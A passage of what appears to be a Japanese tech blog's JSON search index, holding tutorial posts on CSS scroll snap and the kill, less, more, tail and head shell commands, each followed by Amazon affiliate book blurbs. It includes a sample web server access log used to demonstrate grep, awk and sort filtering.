CSSスクロールスナップを使用する際は、アクセシビリティを確保すること。ここでは、ユーザーがコンテンツを自由にスクロールして読むことを妨げる、スクロールスナップの悪い使い方を紹介します。\n.wrapper { scroll-snap-type: y mandatory; } h2 { scroll-snap-align: start; } デモのような実装は絶対にしないでください。\nまとめ 以上がscroll-snap機能についてになります。今までスナップするスクロールを実装する場合はjsを使用していましたが、cssのみで実装可能となると簡単になりますね。\nオススメの書籍 HTML5 \u0026amp; CSS3 デザインレシピ集 本書は、HTML5とCSS3によるWebサイト制作のための\u0026#34;おいしい\u0026#34;レシピ集です。 制作の現場で使われる定番テクニックから、プロ技まで余すところなく集めました。 テキスト/リスト/リンク/画像/ボックス/ テーブル/フォーム/ナビゲーション/ レイアウト/レスポンシブWebデザイン… テーマ別にレシピを整理しているので、引きやすくなっています。 「あのデザインはどう作るんだろう?」が、スグにわかります。 デザイナーからWebプログラマーまで、Web制作に携わるすべての方にお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 HTML5＋CSS3の新しい教科書　改訂新版　基礎から覚える、深く理解できる。 この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【技術の進化に左右されないWebサイトの作り方がわかる！】 Web制作のプロを目指す方に向けて、HTML5\u0026#43;CSS3を使ったWebサイトの作り方を解説した入門書の改訂版。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-14T12:33:28+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/intro_hu1a4f8ee8698ef571fbfcd575aad93d81_24156_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-14-01-wyoshi/","title":"CSSでアプリのようにピタッとスナップするスクロールを作成"},{"content":"killコマンド killコマンドでプロセスIDを指定してプロセスを終了させる killallコマンドで名前を指定してプロセスを終了させる killコマンド概要 プロセスを強制終了させます。\nkillは実行中のプロセスを終了させる場合に使うコマンドです。\nkillコマンドでプロセスを終了させるには、\n$ kill ＜プロセスID＞ で指定します。\n例えば、100番のプロセスならば\n$ kill 100 と指定します。\nプロセスIDは「ps」コマンドで調べることができます。\nkillコマンドの書式 kill [オプション] プロセスID\nkillコマンドの主なオプション オプション 意味 -s シグナル プロセスに送るシグナル名または番号。-シグナル名、-番号でも指定可能 -l シグナル名のリストを表示する killコマンド詳細説明 プロセスＩＤでプロセスを終了させる 「kill プロセスID」で、指定したプロセスを終了させることができます。プロセスIDは「ps」コマンドで確認できます。\n$ kill ＜プロセスＩＤ＞ killallコマンドで名前を指定してプロセスを終了させる 「killall 名前」で、“名前”に指定したプロセスを終了させることができます。\n$ killall ＜プロセス名＞ さまざまなプロセスの調べ方と終了方法 ps aux を使う方法\nbash-5.1$ ps axu | grep hugo | grep -v grep suzukiiichiro 17498 0.0 3.4 5607088 567104 s003 S+ 水11AM 2:58.60 hugo -D server suzukiiichiro 20710 0.0 1.7 5328588 286744 s005 S+ 11:38AM 0:13.50 hugo server bash-5.1$ 最後の grep -v grep は、grep コマンドでプロセス名を検索したプロセスを除くという意味になります。\nさらにawkコマンドでプロセスＩＤを抽出します。\nbash-5.1$ ps axu | grep hugo | grep -v grep | awk \u0026#39;{ print $2; }\u0026#39; 17498 20710 bash-5.1$ pgrep を使う方法\npgrep は、指定したプロセスのプロセスＩＤを抽出する方法です。\nbash-5.1$ pgrep hugo 17498 20710 bash-5.1$ プロセスＩＤが解ったところでプロセスを終了します。\n表記 数値 意味 KILL 9 プロセスの強制終了命令 $ kill -9 17498 $ kill -9 20710 面倒ですね。プロセスがたくさんある場合はとても煩雑です。\nxargsコマンドを使うと一片にプロセスを終了させることができます。\nbash-5.1$ ps axu | grep hugo | grep -v grep | awk \u0026#39;{ print $2; }\u0026#39; | xargs kill -9 終了したいプロセス名が解っている場合は以下のコマンドで一発で全ての同名プロセスを終了させることができます。\n$ killall hugo 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-14T11:39:03+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-14-01-kill-suzuki/","title":"（７）【kill】シェルスクリプトコマンド活用紹介"},{"content":"lessコマンド テキストを1画面ずつ表示する キー操作のヘルプを表示する 長い行を折り返さずに表示する ファイルの末尾まで表示したらすぐに終了する 概要 「less」コマンドは、テキストファイルを1画面ずつ表示するコマンドです。\n$ cat ＜ファイル名＞ | less 「less ファイル名」で実行する他、「コマンド | less」のように、別のコマンドの実行結果を1画面ずつ表示する場合にも使われます。\n$ dmesg | less ヒント ［Enter］キーで1行、スペースキーで1画面先に進める他、上下矢印キーによるスクロールも可能です。表示を終了するには［Q］または［q］キーを入力します。 同じ用途のコマンドに「more」があります。lessコマンドはmoreコマンドよりも機能が多く、画面内で検索したり、上にスクロールしたりすることが可能です。\nlessコマンドの書式 less [オプション] ファイル名\nコマンド | less [オプション]\nlessコマンドの主なオプション 短いオプション 長いオプション 意味 +行数,-行数 指定した行から表示する +/文字列 指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能） -p文字列 \u0026ndash;pattern=文字列 指定文字列を検索し、見つけた行から表示する（正規表現によるパターン指定が可能） -oファイル \u0026ndash;log-file=ファイル パイプ（｜）などで標準入力から入力した内容を表示する際、指定したファイルにコピーを保存する。既存ファイルを指定した場合は、上書きするか、追加するかを確認するメッセージが表示される -Oファイル \u0026ndash;LOG-FILE=ファイル 「-o」と同じだが、既存ファイルを指定した場合は、確認せずに上書きする -kファイル名 \u0026ndash;lesskey-file=ファイル名 lesskeyファイル（キー定義ファイル、「lesskey」コマンドで生成）を指定する -L \u0026ndash;no-lessopen 環境変数LESSOPEN（lessコマンド用のオプションを定義した環境変数）を無視する lessコマンド詳細説明 テキストを1画面ずつ表示する $ less ＜ファイル名＞ で、指定したファイルを1画面ずつ表示します。\n次の画面へ進みたい場合はスペースキー、1行ずつ進めたい場合は［Enter］キーを押します。\n上下の矢印キーや、［y］または［e］キー、［j］または［k］キーで上下にスクロールすることも可能です。\n［q］キーを押すと終了します。\n以下のような使い方もできます。\n$ cat \u0026lt;filename\u0026gt; | less キー操作のヘルプを表示する lessコマンドで画面を表示中に［h］キーを押すと、キー操作のヘルプが表示されます。\nヘルプの表示中でもlessコマンドと同様に、上下のスクロールや検索などの操作が可能です。\n［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります\n長い行を折り返さずに表示する lessコマンドでは、画面の横幅より長い行は折り返して表示されます。\n折り返さずに表示したい場合は、「-S」オプションを使用します。\n左右の矢印キーまたは、［ESC］キーに続いて［(］および［)］キーを押すと、左右に半画面分スクロールします。\n横スクロールの幅は「-#」オプションで指定できます。　$ cat filename | less -S ヒント ［q］キーを押すとヘルプの表示を終了し、元の画面に戻ります。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-13T16:35:49+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-13-01-less-suzuki/","title":"（6）【less】シェルスクリプトコマンド活用紹介"},{"content":"moreコマンド 長いメッセージやテキストファイルを1画面ずつ表示する テキストを1画面ずつ止めながら表示する 実行結果を止めながら表示したいときにはパイプを使う 確認したい箇所がある場合は「+/オプション」でスキップ 行番号付きで表示したいときはcatコマンドと組み合わせる moreコマンドで使える主なサブコマンド moreコマンド概要 moreコマンドは、テキストファイルを1画面ずつ表示するページャコマンドです。\n$ more \u0026lt;ファイル名\u0026gt; で実行する他、\n$ cat \u0026lt;ファイル名\u0026gt; | more のように他のコマンドの実行結果を1画面ずつ表示する際によく使われます。\nまた、moreコマンドにサブコマンドがあり、［Enter］キーで1行、［スペース］キーで1画面先に進み、ファイルの末尾まで表示されると終了します。ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。\nmoreコマンドの書式 more [オプション] filename\ncat filename | more [オプション]\nmoreコマンドの主なオプション オプション 意味 +数値 数値で指定した行から表示する +/文字列 指定した文字列を検索して、見つけた行の2行上から表示する -s 連続した空行を1行にする -l 改ページを無視する -u 下線の処理を行わない -数値 画面の行数を指定する -f 画面での行数ではなく、データの行数を表示する -d 無効なキーが入力された場合には、ビープ音の代わりに簡単なヘルプを表示する moreコマンド詳細説明 「cat」コマンドでテキストファイルの内容を表示したら、思ったよりも長くコマンドを実行した結果がどんどん上に流れてしまって、テキストファイルのの最初の方が読めない！ そんなときに便利なのが「more」コマンドです。\nmoreコマンドは、「more ファイル名」で指定したファイルを1画面ずつ止めながら表示します。次の画面へ進みたいときは［スペース］キーを、1行ずつ画面を進めたいときは［Enter］キーを押します。\nファイルをページャとして読みたい場合\n$ cat \u0026lt;filename\u0026gt; | more dmsgなどのシステムファイルをページャとして読みたい\n$ dmsg | more ヒント 検索を行う場合はページャ画面で「/」記号に続けて検索文字列を入力し、［Enter］キーを押すとその位置までスキップします。nで直前の検索を繰り返します。 ヒント ファイルを表示している途中でも［Q］キーまたは［q］キーで終了できます。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-13T16:35:41+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-13-01-more-suzuki/","title":"（5）【more】シェルスクリプトコマンド活用紹介"},{"content":"tailコマンド tailコマンドでファイルの末尾部分だけを表示する ログファイルを監視する ファイルの特定の範囲の行を取り出す（headとtail） 概要 headコマンドとは逆に、ファイルの末尾だけ表示するのがtailコマンドです。\nログファイルは、基本ファイルの末尾に新たな記録が追加されます。\n「more」コマンドや「less」コマンドで表示しようとすると、末尾まで進むのが面倒だし、ファイルが大きい場合は読み込むのにも時間がかかります。\n「tail」コマンドは、ファイルの末尾開かないので手軽で処理も高速です。\n$ cat ＜ファイル名＞ | tail tailコマンドも、headコマンド同様、「-n」オプションで表示する行数を指定することができます。\n$ cat ＜ファイル名＞ | tail -n10 また、tailコマンド最大の魅力は リアルタイムに出力を追記する tail -fです。\nログ監視などに多用されるこの具体例も以下に示します。\n$ sudo tail -f /var/log/httpd/access_log tailコマンドの書式 tail [オプション] ファイル名\ntailコマンドの主なオプション 短いオプション 長いオプション 意味 -c 数字 \u0026ndash;bytes 数字 末尾の指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=10001000, M=10241024…） -n 数字 \u0026ndash;lines 数字 末尾の指定した行数のみ表示する -q \u0026ndash;quiet, \u0026ndash;silent ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う） -v \u0026ndash;verbose 常にファイルごとのヘッダ出力を行う -f \u0026ndash;follow ファイルを監視して内容が追加されるたびに末尾に表示する（ログ監視などに使用する。［Ctrl］＋［C］キーで終了） tailコマンド詳細説明 tailコマンドでファイルの末尾部分だけを表示する ファイルの末尾を表示します。tail -n で表示行数を変更できます。\ntail -n10 と デフォルトの tail は同じ出力となります。\n$ cat filename | tail -n10 ログファイルを監視する tailコマンドの「-f」オプションを使うと、ログファイルのように、刻々と内容が追加されていくファイル監視ができるようになります。「-f」は、ファイルなどを監視する際、内容が新たに追加されるたびに末尾に表示するオプションです。ログの監視を終了するには、［Ctrl］＋［C］キーを押します。\n$ sudo tail -f /var/log/httpd/error_log ヒント tail -f コマンドはとてもよく使います。 tail -f を実行するtailf コマンドもあります。(Oによりますが) ファイルの特定の範囲の行を取り出す（headとtail） ファイル後ろの200行目のところから、ファイル先頭に向かって100行を取り出すにはどうしたらよいか？\ncat filename | tail -n200 これだとファイル末尾から200行を出力するにすぎない。\ntail コマンドのみに頼ろうとすると難しいようだ。\n実は、head コマンドも使えば、「後ろ200行の先頭100行」を取り出せる。\n$ cat filename | tail -n200 | head -n 100 コマンドの実行結果の10001行目から10100行目までが欲しい時は以下の通り。\n$ cat filename | head -n10100 | tail -n100 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-11T14:31:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/bash_hu5909208fb16d2109d0cdca2186f9358e_33901_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-11-01-tail-suzuki/","title":"（４）【tail】シェルスクリプトコマンド活用紹介"},{"content":"headコマンド headコマンドでファイルの先頭部分だけを表示する パイプを使って実行結果の最初の部分だけを確認する tailコマンドでファイルの末尾部分だけを表示する ログファイルを監視する 概要 headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。\n表示する行数は、オプションで変更することができます。\n$ cat ＜ファイル名＞ | head -n10 headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。\nheadコマンドの書式 head [オプション] ファイル名\nheadコマンドの主なオプション オプション 長いオプション 意味 -c 数字 \u0026ndash;bytes 数字 先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=10001000, M=10241024…） -n 数字 \u0026ndash;lines 数字 先頭から指定した行数のみ表示する -q \u0026ndash;quiet, \u0026ndash;silent ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う） -v \u0026ndash;verbose 常にファイルごとのヘッダ出力を行う headコマンド詳細説明 headコマンドはファイルの先頭から１０行を表示するコマンドです。\n$ cat filename | head よく使われるオプションは、出力する行数を指定するオプション「n」です。\n$ cat filename | head -n20 データをソートしてベスト１０を出力するという場合によく使います。\n$ sudo cat /var/log/httpd/access_log | grep -iv \u0026#34;ELB-Health-Checker\u0026#34; | awk -F \u0026#39;\u0026#34;\u0026#39; \u0026#39;{ print $1; }\u0026#39; | awk \u0026#39;{ print $2; }\u0026#39; | sort | uniq -c | sort -nr | head sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。\nでは、順番に説明していきます。\nまずは純粋にアクセスログを出力します。\n長いのでheadコマンドを使いましょう。\nsuzuki$ sudo cat /var/log/httpd/access_log | head 172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] \u0026#34;GET / HTTP/1.1\u0026#34; 302 206 \u0026#34;-\u0026#34; \u0026#34;ELB-HealthChecker/2.0\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; : : : AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。\ngrepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。\nsuzuki$ sudo cat /var/log/httpd/access_log | grep -v \u0026#34;ELB-HealthChecker\u0026#34; | head 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] \u0026#34;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1\u0026#34; 302 230 \u0026#34;-\u0026#34; \u0026#34;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154\u0026#34; 117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] \u0026#34;CONNECT guba.eastmoney.com:443 HTTP/1.1\u0026#34; 302 215 \u0026#34;-\u0026#34; \u0026#34;Apache-HttpClient/4.1 (java 1.5)\u0026#34; 98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] \u0026#34;GET 